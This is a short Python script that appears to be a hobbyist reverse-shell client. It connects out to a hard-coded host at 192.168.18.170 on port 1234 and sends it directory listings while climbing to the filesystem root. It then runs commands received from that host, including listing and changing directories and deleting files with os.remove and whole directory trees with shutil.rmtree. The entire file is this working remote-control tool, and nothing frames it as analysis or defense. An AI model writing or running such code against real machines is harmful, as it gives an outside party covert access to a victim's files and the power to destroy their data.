import socket
import os
import time
import colorama as clr
import shutil
host='192.168.18.170'
port=1234

client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client_socket.connect((host,port))

def send(message):
    client_socket.send(message.encode('utf-8'))


parent_dir = os.path.dirname(os.getcwd())
def tm():
    time.sleep(0.5)
def pdir():
    tm()
    send(clr.Fore.GREEN+"Current Working directory: "+os.getcwd())
def odir():
    tm()
    os.chdir("..")
    send(clr.Fore.BLUE+"Gone one step back")
def ls():
    tm()
    stuff=os.listdir(os.getcwd())
    send(f"{clr.Fore.YELLOW}Stuff inside current dir: {stuff}")
pdir()
ls()
while not parent_dir == os.getcwd():
    odir()
    pdir()
    ls()
    parent_dir = os.path.dirname(os.getcwd())
def filter(num, text):
    filtered = ""
    # Only iterate up to the length of the text to avoid index out of range
    for r in range(min(num, len(text))):
        filtered += text[r]
    return filtered

def trim(a,b,text):
    ran=b-a
    trimed=""
    for l in range(ran):
        trimed+=text[a]
        a+=1
    return trimed
send(clr.Fore.LIGHTMAGENTA_EX+"On the root directory!!!")

#W commands
def commandls(command):
    path=trim(3,len(command),command)
    if command=="ls":
        send(clr.Fore.YELLOW+str(os.listdir(os.getcwd())))
    else:
        send(clr.Fore.YELLOW+str(os.listdir(path)))
def commandcd(command):
    path=trim(3,len(command),command)
    try:
        os.chdir(path)
    except:
        send("No such directory!")
def commandrm(command):
    path1=trim(3,len(command),command)
    try:
        os.remove(path1)
    except:
        send("Not a file!")
def commandrmdir(command):
    path=trim(6,len(command),command)
    try:
        shutil.rmtree(path)
    except:
        send("Not a directory!")
try:
    while True:
        command=client_socket.recv(4096).decode('utf-8')
        if filter(2,command) == "ls":
            commandls(command)
        if filter(2,command) == "cd":
            commandcd(command)
        if command == "exit":
            break
        if command == "pwd":
            pdir()
        if filter(2,command) == "rm" and filter(5,command) != "rmdir":
            commandrm(command)
        if filter(5,command) == "rmdir":
            commandrmdir(command)
    send(clr.Fore.RED+"Shell closed!!!")
except KeyboardInterrupt:
    print("Closing connection!!!")
    send("Client closed!")
    send("Closekey123!")
    client_socket.close()
except Exception as e:
    send(f"Error found! {e}")
    send("Closing connection!")
    send("Closekey123!")
    client_socket.close()
